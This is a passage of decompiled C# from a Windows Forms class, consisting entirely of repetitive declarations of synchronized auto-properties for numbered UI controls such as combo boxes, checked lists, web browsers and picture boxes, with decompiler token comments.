		// (set) Token: 0x06000A4C RID: 2636 RVA: 0x00036B6E File Offset: 0x00034D6E
		internal virtual ComboBox ComboBox14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700050F RID: 1295
		// (get) Token: 0x06000A4D RID: 2637 RVA: 0x00036B77 File Offset: 0x00034D77
		// (set) Token: 0x06000A4E RID: 2638 RVA: 0x00036B7F File Offset: 0x00034D7F
		internal virtual CheckedListBox CheckedListBox19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000510 RID: 1296
		// (get) Token: 0x06000A4F RID: 2639 RVA: 0x00036B88 File Offset: 0x00034D88
		// (set) Token: 0x06000A50 RID: 2640 RVA: 0x00036B90 File Offset: 0x00034D90
		internal virtual DateTimePicker DateTimePicker14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000511 RID: 1297
		// (get) Token: 0x06000A51 RID: 2641 RVA: 0x00036B99 File Offset: 0x00034D99
		// (set) Token: 0x06000A52 RID: 2642 RVA: 0x00036BA1 File Offset: 0x00034DA1
		internal virtual CheckedListBox CheckedListBox20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000512 RID: 1298
		// (get) Token: 0x06000A53 RID: 2643 RVA: 0x00036BAA File Offset: 0x00034DAA
		// (set) Token: 0x06000A54 RID: 2644 RVA: 0x00036BB2 File Offset: 0x00034DB2
		internal virtual CheckedListBox CheckedListBox21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000513 RID: 1299
		// (get) Token: 0x06000A55 RID: 2645 RVA: 0x00036BBB File Offset: 0x00034DBB
		// (set) Token: 0x06000A56 RID: 2646 RVA: 0x00036BC3 File Offset: 0x00034DC3
		internal virtual MaskedTextBox MaskedTextBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000514 RID: 1300
		// (get) Token: 0x06000A57 RID: 2647 RVA: 0x00036BCC File Offset: 0x00034DCC
		// (set) Token: 0x06000A58 RID: 2648 RVA: 0x00036BD4 File Offset: 0x00034DD4
		internal virtual NumericUpDown NumericUpDown15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000515 RID: 1301
		// (get) Token: 0x06000A59 RID: 2649 RVA: 0x00036BDD File Offset: 0x00034DDD
		// (set) Token: 0x06000A5A RID: 2650 RVA: 0x00036BE5 File Offset: 0x00034DE5
		internal virtual PictureBox PictureBox29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000516 RID: 1302
		// (get) Token: 0x06000A5B RID: 2651 RVA: 0x00036BEE File Offset: 0x00034DEE
		// (set) Token: 0x06000A5C RID: 2652 RVA: 0x00036BF6 File Offset: 0x00034DF6
		internal virtual WebBrowser WebBrowser8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000517 RID: 1303
		// (get) Token: 0x06000A5D RID: 2653 RVA: 0x00036BFF File Offset: 0x00034DFF
		// (set) Token: 0x06000A5E RID: 2654 RVA: 0x00036C07 File Offset: 0x00034E07
		internal virtual TreeView TreeView8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000518 RID: 1304
		// (get) Token: 0x06000A5F RID: 2655 RVA: 0x00036C10 File Offset: 0x00034E10
		// (set) Token: 0x06000A60 RID: 2656 RVA: 0x00036C18 File Offset: 0x00034E18
		internal virtual TextBox TextBox8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000519 RID: 1305
		// (get) Token: 0x06000A61 RID: 2657 RVA: 0x00036C21 File Offset: 0x00034E21
		// (set) Token: 0x06000A62 RID: 2658 RVA: 0x00036C29 File Offset: 0x00034E29
		internal virtual RadioButton RadioButton15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700051A RID: 1306
		// (get) Token: 0x06000A63 RID: 2659 RVA: 0x00036C32 File Offset: 0x00034E32
		// (set) Token: 0x06000A64 RID: 2660 RVA: 0x00036C3A File Offset: 0x00034E3A
		internal virtual RadioButton RadioButton16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700051B RID: 1307
		// (get) Token: 0x06000A65 RID: 2661 RVA: 0x00036C43 File Offset: 0x00034E43
		// (set) Token: 0x06000A66 RID: 2662 RVA: 0x00036C4B File Offset: 0x00034E4B
		internal virtual PictureBox PictureBox30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700051C RID: 1308
		// (get) Token: 0x06000A67 RID: 2663 RVA: 0x00036C54 File Offset: 0x00034E54
		// (set) Token: 0x06000A68 RID: 2664 RVA: 0x00036C5C File Offset: 0x00034E5C
		internal virtual ComboBox ComboBox15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700051D RID: 1309
		// (get) Token: 0x06000A69 RID: 2665 RVA: 0x00036C65 File Offset: 0x00034E65
		// (set) Token: 0x06000A6A RID: 2666 RVA: 0x00036C6D File Offset: 0x00034E6D
		internal virtual Label Label8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700051E RID: 1310
		// (get) Token: 0x06000A6B RID: 2667 RVA: 0x00036C76 File Offset: 0x00034E76
		// (set) Token: 0x06000A6C RID: 2668 RVA: 0x00036C7E File Offset: 0x00034E7E
		internal virtual ListView ListView8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700051F RID: 1311
		// (get) Token: 0x06000A6D RID: 2669 RVA: 0x00036C87 File Offset: 0x00034E87
		// (set) Token: 0x06000A6E RID: 2670 RVA: 0x00036C8F File Offset: 0x00034E8F
		internal virtual DateTimePicker DateTimePicker15 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000520 RID: 1312
		// (get) Token: 0x06000A6F RID: 2671 RVA: 0x00036C98 File Offset: 0x00034E98
		// (set) Token: 0x06000A70 RID: 2672 RVA: 0x00036CA0 File Offset: 0x00034EA0
		internal virtual MonthCalendar MonthCalendar8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000521 RID: 1313
		// (get) Token: 0x06000A71 RID: 2673 RVA: 0x00036CA9 File Offset: 0x00034EA9
		// (set) Token: 0x06000A72 RID: 2674 RVA: 0x00036CB1 File Offset: 0x00034EB1
		internal virtual PictureBox PictureBox31 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000522 RID: 1314
		// (get) Token: 0x06000A73 RID: 2675 RVA: 0x00036CBA File Offset: 0x00034EBA
		// (set) Token: 0x06000A74 RID: 2676 RVA: 0x00036CC2 File Offset: 0x00034EC2
		internal virtual NumericUpDown NumericUpDown16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000523 RID: 1315
		// (get) Token: 0x06000A75 RID: 2677 RVA: 0x00036CCB File Offset: 0x00034ECB
		// (set) Token: 0x06000A76 RID: 2678 RVA: 0x00036CD3 File Offset: 0x00034ED3
		internal virtual ProgressBar ProgressBar8 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000524 RID: 1316
		// (get) Token: 0x06000A77 RID: 2679 RVA: 0x00036CDC File Offset: 0x00034EDC
		// (set) Token: 0x06000A78 RID: 2680 RVA: 0x00036CE4 File Offset: 0x00034EE4
		internal virtual PictureBox PictureBox32 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000525 RID: 1317
		// (get) Token: 0x06000A79 RID: 2681 RVA: 0x00036CED File Offset: 0x00034EED
		// (set) Token: 0x06000A7A RID: 2682 RVA: 0x00036CF5 File Offset: 0x00034EF5
		internal virtual MaskedTextBox MaskedTextBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000526 RID: 1318
		// (get) Token: 0x06000A7B RID: 2683 RVA: 0x00036CFE File Offset: 0x00034EFE
		// (set) Token: 0x06000A7C RID: 2684 RVA: 0x00036D06 File Offset: 0x00034F06
		internal virtual ComboBox ComboBox16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000527 RID: 1319
		// (get) Token: 0x06000A7D RID: 2685 RVA: 0x00036D0F File Offset: 0x00034F0F
		// (set) Token: 0x06000A7E RID: 2686 RVA: 0x00036D17 File Offset: 0x00034F17
		internal virtual CheckedListBox CheckedListBox22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000528 RID: 1320
		// (get) Token: 0x06000A7F RID: 2687 RVA: 0x00036D20 File Offset: 0x00034F20
		// (set) Token: 0x06000A80 RID: 2688 RVA: 0x00036D28 File Offset: 0x00034F28
		internal virtual DateTimePicker DateTimePicker16 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000529 RID: 1321
		// (get) Token: 0x06000A81 RID: 2689 RVA: 0x00036D31 File Offset: 0x00034F31
		// (set) Token: 0x06000A82 RID: 2690 RVA: 0x00036D39 File Offset: 0x00034F39
		internal virtual CheckedListBox CheckedListBox23 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700052A RID: 1322
		// (get) Token: 0x06000A83 RID: 2691 RVA: 0x00036D42 File Offset: 0x00034F42
		// (set) Token: 0x06000A84 RID: 2692 RVA: 0x00036D4A File Offset: 0x00034F4A
		internal virtual CheckedListBox CheckedListBox24 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700052B RID: 1323
		// (get) Token: 0x06000A85 RID: 2693 RVA: 0x00036D53 File Offset: 0x00034F53
		// (set) Token: 0x06000A86 RID: 2694 RVA: 0x00036D5B File Offset: 0x00034F5B
		internal virtual NumericUpDown NumericUpDown17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700052C RID: 1324
		// (get) Token: 0x06000A87 RID: 2695 RVA: 0x00036D64 File Offset: 0x00034F64
		// (set) Token: 0x06000A88 RID: 2696 RVA: 0x00036D6C File Offset: 0x00034F6C
		internal virtual PictureBox PictureBox33 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700052D RID: 1325
		// (get) Token: 0x06000A89 RID: 2697 RVA: 0x00036D75 File Offset: 0x00034F75
		// (set) Token: 0x06000A8A RID: 2698 RVA: 0x00036D7D File Offset: 0x00034F7D
		internal virtual WebBrowser WebBrowser9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700052E RID: 1326
		// (get) Token: 0x06000A8B RID: 2699 RVA: 0x00036D86 File Offset: 0x00034F86
		// (set) Token: 0x06000A8C RID: 2700 RVA: 0x00036D8E File Offset: 0x00034F8E
		internal virtual TreeView TreeView9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700052F RID: 1327
		// (get) Token: 0x06000A8D RID: 2701 RVA: 0x00036D97 File Offset: 0x00034F97
		// (set) Token: 0x06000A8E RID: 2702 RVA: 0x00036D9F File Offset: 0x00034F9F
		internal virtual TextBox TextBox9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000530 RID: 1328
		// (get) Token: 0x06000A8F RID: 2703 RVA: 0x00036DA8 File Offset: 0x00034FA8
		// (set) Token: 0x06000A90 RID: 2704 RVA: 0x00036DB0 File Offset: 0x00034FB0
		internal virtual RadioButton RadioButton17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000531 RID: 1329
		// (get) Token: 0x06000A91 RID: 2705 RVA: 0x00036DB9 File Offset: 0x00034FB9
		// (set) Token: 0x06000A92 RID: 2706 RVA: 0x00036DC1 File Offset: 0x00034FC1
		internal virtual RadioButton RadioButton18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000532 RID: 1330
		// (get) Token: 0x06000A93 RID: 2707 RVA: 0x00036DCA File Offset: 0x00034FCA
		// (set) Token: 0x06000A94 RID: 2708 RVA: 0x00036DD2 File Offset: 0x00034FD2
		internal virtual PictureBox PictureBox34 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000533 RID: 1331
		// (get) Token: 0x06000A95 RID: 2709 RVA: 0x00036DDB File Offset: 0x00034FDB
		// (set) Token: 0x06000A96 RID: 2710 RVA: 0x00036DE3 File Offset: 0x00034FE3
		internal virtual ComboBox ComboBox17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000534 RID: 1332
		// (get) Token: 0x06000A97 RID: 2711 RVA: 0x00036DEC File Offset: 0x00034FEC
		// (set) Token: 0x06000A98 RID: 2712 RVA: 0x00036DF4 File Offset: 0x00034FF4
		internal virtual Label Label9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000535 RID: 1333
		// (get) Token: 0x06000A99 RID: 2713 RVA: 0x00036DFD File Offset: 0x00034FFD
		// (set) Token: 0x06000A9A RID: 2714 RVA: 0x00036E05 File Offset: 0x00035005
		internal virtual ListView ListView9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000536 RID: 1334
		// (get) Token: 0x06000A9B RID: 2715 RVA: 0x00036E0E File Offset: 0x0003500E
		// (set) Token: 0x06000A9C RID: 2716 RVA: 0x00036E16 File Offset: 0x00035016
		internal virtual DateTimePicker DateTimePicker17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000537 RID: 1335
		// (get) Token: 0x06000A9D RID: 2717 RVA: 0x00036E1F File Offset: 0x0003501F
		// (set) Token: 0x06000A9E RID: 2718 RVA: 0x00036E27 File Offset: 0x00035027
		internal virtual MonthCalendar MonthCalendar9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000538 RID: 1336
		// (get) Token: 0x06000A9F RID: 2719 RVA: 0x00036E30 File Offset: 0x00035030
		// (set) Token: 0x06000AA0 RID: 2720 RVA: 0x00036E38 File Offset: 0x00035038
		internal virtual PictureBox PictureBox35 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000539 RID: 1337
		// (get) Token: 0x06000AA1 RID: 2721 RVA: 0x00036E41 File Offset: 0x00035041
		// (set) Token: 0x06000AA2 RID: 2722 RVA: 0x00036E49 File Offset: 0x00035049
		internal virtual NumericUpDown NumericUpDown18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700053A RID: 1338
		// (get) Token: 0x06000AA3 RID: 2723 RVA: 0x00036E52 File Offset: 0x00035052
		// (set) Token: 0x06000AA4 RID: 2724 RVA: 0x00036E5A File Offset: 0x0003505A
		internal virtual ProgressBar ProgressBar9 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700053B RID: 1339
		// (get) Token: 0x06000AA5 RID: 2725 RVA: 0x00036E63 File Offset: 0x00035063
		// (set) Token: 0x06000AA6 RID: 2726 RVA: 0x00036E6B File Offset: 0x0003506B
		internal virtual PictureBox PictureBox36 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700053C RID: 1340
		// (get) Token: 0x06000AA7 RID: 2727 RVA: 0x00036E74 File Offset: 0x00035074
		// (set) Token: 0x06000AA8 RID: 2728 RVA: 0x00036E7C File Offset: 0x0003507C
		internal virtual MaskedTextBox MaskedTextBox17 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700053D RID: 1341
		// (get) Token: 0x06000AA9 RID: 2729 RVA: 0x00036E85 File Offset: 0x00035085
		// (set) Token: 0x06000AAA RID: 2730 RVA: 0x00036E8D File Offset: 0x0003508D
		internal virtual ComboBox ComboBox18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700053E RID: 1342
		// (get) Token: 0x06000AAB RID: 2731 RVA: 0x00036E96 File Offset: 0x00035096
		// (set) Token: 0x06000AAC RID: 2732 RVA: 0x00036E9E File Offset: 0x0003509E
		internal virtual CheckedListBox CheckedListBox25 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700053F RID: 1343
		// (get) Token: 0x06000AAD RID: 2733 RVA: 0x00036EA7 File Offset: 0x000350A7
		// (set) Token: 0x06000AAE RID: 2734 RVA: 0x00036EAF File Offset: 0x000350AF
		internal virtual DateTimePicker DateTimePicker18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000540 RID: 1344
		// (get) Token: 0x06000AAF RID: 2735 RVA: 0x00036EB8 File Offset: 0x000350B8
		// (set) Token: 0x06000AB0 RID: 2736 RVA: 0x00036EC0 File Offset: 0x000350C0
		internal virtual CheckedListBox CheckedListBox26 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000541 RID: 1345
		// (get) Token: 0x06000AB1 RID: 2737 RVA: 0x00036EC9 File Offset: 0x000350C9
		// (set) Token: 0x06000AB2 RID: 2738 RVA: 0x00036ED1 File Offset: 0x000350D1
		internal virtual CheckedListBox CheckedListBox27 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000542 RID: 1346
		// (get) Token: 0x06000AB3 RID: 2739 RVA: 0x00036EDA File Offset: 0x000350DA
		// (set) Token: 0x06000AB4 RID: 2740 RVA: 0x00036EE2 File Offset: 0x000350E2
		internal virtual MaskedTextBox MaskedTextBox18 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000543 RID: 1347
		// (get) Token: 0x06000AB5 RID: 2741 RVA: 0x00036EEB File Offset: 0x000350EB
		// (set) Token: 0x06000AB6 RID: 2742 RVA: 0x00036EF3 File Offset: 0x000350F3
		internal virtual NumericUpDown NumericUpDown19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000544 RID: 1348
		// (get) Token: 0x06000AB7 RID: 2743 RVA: 0x00036EFC File Offset: 0x000350FC
		// (set) Token: 0x06000AB8 RID: 2744 RVA: 0x00036F04 File Offset: 0x00035104
		internal virtual PictureBox PictureBox37 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000545 RID: 1349
		// (get) Token: 0x06000AB9 RID: 2745 RVA: 0x00036F0D File Offset: 0x0003510D
		// (set) Token: 0x06000ABA RID: 2746 RVA: 0x00036F15 File Offset: 0x00035115
		internal virtual WebBrowser WebBrowser10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000546 RID: 1350
		// (get) Token: 0x06000ABB RID: 2747 RVA: 0x00036F1E File Offset: 0x0003511E
		// (set) Token: 0x06000ABC RID: 2748 RVA: 0x00036F26 File Offset: 0x00035126
		internal virtual TreeView TreeView10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000547 RID: 1351
		// (get) Token: 0x06000ABD RID: 2749 RVA: 0x00036F2F File Offset: 0x0003512F
		// (set) Token: 0x06000ABE RID: 2750 RVA: 0x00036F37 File Offset: 0x00035137
		internal virtual TextBox TextBox10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000548 RID: 1352
		// (get) Token: 0x06000ABF RID: 2751 RVA: 0x00036F40 File Offset: 0x00035140
		// (set) Token: 0x06000AC0 RID: 2752 RVA: 0x00036F48 File Offset: 0x00035148
		internal virtual RadioButton RadioButton19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000549 RID: 1353
		// (get) Token: 0x06000AC1 RID: 2753 RVA: 0x00036F51 File Offset: 0x00035151
		// (set) Token: 0x06000AC2 RID: 2754 RVA: 0x00036F59 File Offset: 0x00035159
		internal virtual RadioButton RadioButton20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700054A RID: 1354
		// (get) Token: 0x06000AC3 RID: 2755 RVA: 0x00036F62 File Offset: 0x00035162
		// (set) Token: 0x06000AC4 RID: 2756 RVA: 0x00036F6A File Offset: 0x0003516A
		internal virtual PictureBox PictureBox38 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700054B RID: 1355
		// (get) Token: 0x06000AC5 RID: 2757 RVA: 0x00036F73 File Offset: 0x00035173
		// (set) Token: 0x06000AC6 RID: 2758 RVA: 0x00036F7B File Offset: 0x0003517B
		internal virtual ComboBox ComboBox19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700054C RID: 1356
		// (get) Token: 0x06000AC7 RID: 2759 RVA: 0x00036F84 File Offset: 0x00035184
		// (set) Token: 0x06000AC8 RID: 2760 RVA: 0x00036F8C File Offset: 0x0003518C
		internal virtual Label Label10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700054D RID: 1357
		// (get) Token: 0x06000AC9 RID: 2761 RVA: 0x00036F95 File Offset: 0x00035195
		// (set) Token: 0x06000ACA RID: 2762 RVA: 0x00036F9D File Offset: 0x0003519D
		internal virtual ListView ListView10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700054E RID: 1358
		// (get) Token: 0x06000ACB RID: 2763 RVA: 0x00036FA6 File Offset: 0x000351A6
		// (set) Token: 0x06000ACC RID: 2764 RVA: 0x00036FAE File Offset: 0x000351AE
		internal virtual DateTimePicker DateTimePicker19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700054F RID: 1359
		// (get) Token: 0x06000ACD RID: 2765 RVA: 0x00036FB7 File Offset: 0x000351B7
		// (set) Token: 0x06000ACE RID: 2766 RVA: 0x00036FBF File Offset: 0x000351BF
		internal virtual MonthCalendar MonthCalendar10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000550 RID: 1360
		// (get) Token: 0x06000ACF RID: 2767 RVA: 0x00036FC8 File Offset: 0x000351C8
		// (set) Token: 0x06000AD0 RID: 2768 RVA: 0x00036FD0 File Offset: 0x000351D0
		internal virtual PictureBox PictureBox39 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000551 RID: 1361
		// (get) Token: 0x06000AD1 RID: 2769 RVA: 0x00036FD9 File Offset: 0x000351D9
		// (set) Token: 0x06000AD2 RID: 2770 RVA: 0x00036FE1 File Offset: 0x000351E1
		internal virtual NumericUpDown NumericUpDown20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000552 RID: 1362
		// (get) Token: 0x06000AD3 RID: 2771 RVA: 0x00036FEA File Offset: 0x000351EA
		// (set) Token: 0x06000AD4 RID: 2772 RVA: 0x00036FF2 File Offset: 0x000351F2
		internal virtual ProgressBar ProgressBar10 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000553 RID: 1363
		// (get) Token: 0x06000AD5 RID: 2773 RVA: 0x00036FFB File Offset: 0x000351FB
		// (set) Token: 0x06000AD6 RID: 2774 RVA: 0x00037003 File Offset: 0x00035203
		internal virtual PictureBox PictureBox40 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000554 RID: 1364
		// (get) Token: 0x06000AD7 RID: 2775 RVA: 0x0003700C File Offset: 0x0003520C
		// (set) Token: 0x06000AD8 RID: 2776 RVA: 0x00037014 File Offset: 0x00035214
		internal virtual MaskedTextBox MaskedTextBox19 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000555 RID: 1365
		// (get) Token: 0x06000AD9 RID: 2777 RVA: 0x0003701D File Offset: 0x0003521D
		// (set) Token: 0x06000ADA RID: 2778 RVA: 0x00037025 File Offset: 0x00035225
		internal virtual ComboBox ComboBox20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000556 RID: 1366
		// (get) Token: 0x06000ADB RID: 2779 RVA: 0x0003702E File Offset: 0x0003522E
		// (set) Token: 0x06000ADC RID: 2780 RVA: 0x00037036 File Offset: 0x00035236
		internal virtual CheckedListBox CheckedListBox28 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000557 RID: 1367
		// (get) Token: 0x06000ADD RID: 2781 RVA: 0x0003703F File Offset: 0x0003523F
		// (set) Token: 0x06000ADE RID: 2782 RVA: 0x00037047 File Offset: 0x00035247
		internal virtual DateTimePicker DateTimePicker20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000558 RID: 1368
		// (get) Token: 0x06000ADF RID: 2783 RVA: 0x00037050 File Offset: 0x00035250
		// (set) Token: 0x06000AE0 RID: 2784 RVA: 0x00037058 File Offset: 0x00035258
		internal virtual CheckedListBox CheckedListBox29 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000559 RID: 1369
		// (get) Token: 0x06000AE1 RID: 2785 RVA: 0x00037061 File Offset: 0x00035261
		// (set) Token: 0x06000AE2 RID: 2786 RVA: 0x00037069 File Offset: 0x00035269
		internal virtual CheckedListBox CheckedListBox30 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700055A RID: 1370
		// (get) Token: 0x06000AE3 RID: 2787 RVA: 0x00037072 File Offset: 0x00035272
		// (set) Token: 0x06000AE4 RID: 2788 RVA: 0x0003707A File Offset: 0x0003527A
		internal virtual MaskedTextBox MaskedTextBox20 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700055B RID: 1371
		// (get) Token: 0x06000AE5 RID: 2789 RVA: 0x00037083 File Offset: 0x00035283
		// (set) Token: 0x06000AE6 RID: 2790 RVA: 0x0003708B File Offset: 0x0003528B
		internal virtual NumericUpDown NumericUpDown21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700055C RID: 1372
		// (get) Token: 0x06000AE7 RID: 2791 RVA: 0x00037094 File Offset: 0x00035294
		// (set) Token: 0x06000AE8 RID: 2792 RVA: 0x0003709C File Offset: 0x0003529C
		internal virtual PictureBox PictureBox41 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700055D RID: 1373
		// (get) Token: 0x06000AE9 RID: 2793 RVA: 0x000370A5 File Offset: 0x000352A5
		// (set) Token: 0x06000AEA RID: 2794 RVA: 0x000370AD File Offset: 0x000352AD
		internal virtual WebBrowser WebBrowser11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700055E RID: 1374
		// (get) Token: 0x06000AEB RID: 2795 RVA: 0x000370B6 File Offset: 0x000352B6
		// (set) Token: 0x06000AEC RID: 2796 RVA: 0x000370BE File Offset: 0x000352BE
		internal virtual TreeView TreeView11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700055F RID: 1375
		// (get) Token: 0x06000AED RID: 2797 RVA: 0x000370C7 File Offset: 0x000352C7
		// (set) Token: 0x06000AEE RID: 2798 RVA: 0x000370CF File Offset: 0x000352CF
		internal virtual TextBox TextBox11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000560 RID: 1376
		// (get) Token: 0x06000AEF RID: 2799 RVA: 0x000370D8 File Offset: 0x000352D8
		// (set) Token: 0x06000AF0 RID: 2800 RVA: 0x000370E0 File Offset: 0x000352E0
		internal virtual RadioButton RadioButton21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000561 RID: 1377
		// (get) Token: 0x06000AF1 RID: 2801 RVA: 0x000370E9 File Offset: 0x000352E9
		// (set) Token: 0x06000AF2 RID: 2802 RVA: 0x000370F1 File Offset: 0x000352F1
		internal virtual RadioButton RadioButton22 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000562 RID: 1378
		// (get) Token: 0x06000AF3 RID: 2803 RVA: 0x000370FA File Offset: 0x000352FA
		// (set) Token: 0x06000AF4 RID: 2804 RVA: 0x00037102 File Offset: 0x00035302
		internal virtual PictureBox PictureBox42 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000563 RID: 1379
		// (get) Token: 0x06000AF5 RID: 2805 RVA: 0x0003710B File Offset: 0x0003530B
		// (set) Token: 0x06000AF6 RID: 2806 RVA: 0x00037113 File Offset: 0x00035313
		internal virtual ComboBox ComboBox21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000564 RID: 1380
		// (get) Token: 0x06000AF7 RID: 2807 RVA: 0x0003711C File Offset: 0x0003531C
		// (set) Token: 0x06000AF8 RID: 2808 RVA: 0x00037124 File Offset: 0x00035324
		internal virtual Label Label11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000565 RID: 1381
		// (get) Token: 0x06000AF9 RID: 2809 RVA: 0x0003712D File Offset: 0x0003532D
		// (set) Token: 0x06000AFA RID: 2810 RVA: 0x00037135 File Offset: 0x00035335
		internal virtual ListView ListView11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000566 RID: 1382
		// (get) Token: 0x06000AFB RID: 2811 RVA: 0x0003713E File Offset: 0x0003533E
		// (set) Token: 0x06000AFC RID: 2812 RVA: 0x00037146 File Offset: 0x00035346
		internal virtual DateTimePicker DateTimePicker21 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000567 RID: 1383
		// (get) Token: 0x06000AFD RID: 2813 RVA: 0x0003714F File Offset: 0x0003534F
		// (set) Token: 0x06000AFE RID: 2814 RVA: 0x00037157 File Offset: 0x00035357
		internal virtual MonthCalendar MonthCalendar11 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x17000568 RID: 1384
		// (get) Token: 0x06000AFF RID: 2815 RVA: 0x00037160 File Offset: 0x00035360
		// (set) Token: 0x06000B00 RID: 2816 RVA: 0x00037168 File Offset: 0x00035368
